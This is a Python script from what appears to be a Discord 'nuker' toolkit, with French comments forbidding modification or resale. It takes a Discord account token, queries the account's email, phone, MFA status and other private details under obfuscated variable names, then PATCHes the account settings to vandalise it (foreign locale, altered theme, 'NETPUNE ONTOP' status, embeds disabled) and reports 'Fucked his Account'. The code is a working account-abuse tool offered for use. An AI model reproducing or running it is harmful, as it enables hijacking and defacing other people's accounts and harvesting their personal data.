
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
#    ------------------------------------------------------------------------------------------------
import random
import requests
from colorama import Fore
import time
from Config.Util import *
from Config.Config import *
heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]
def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers
try: v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
except: v4r_api = {"None": "None"}
v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

def fuckAccount(token):
        
        setting = {
            'avatar':'75831603e8e28657ad03d7ec1c58ea40',
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
            'custom_status':{
                'text': 'NETPUNE ONTOP',
                'emoji_name': '⏱️'
            },
            'render_embeds': False,
            'render_reactions': False
        }
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{Fore.WHITE}[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] Fucked his Account")
        
        time.sleep(2)
token = input(f"{Fore.WHITE}[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] Token : {Fore.LIGHTGREEN_EX}")
fuckAccount(token)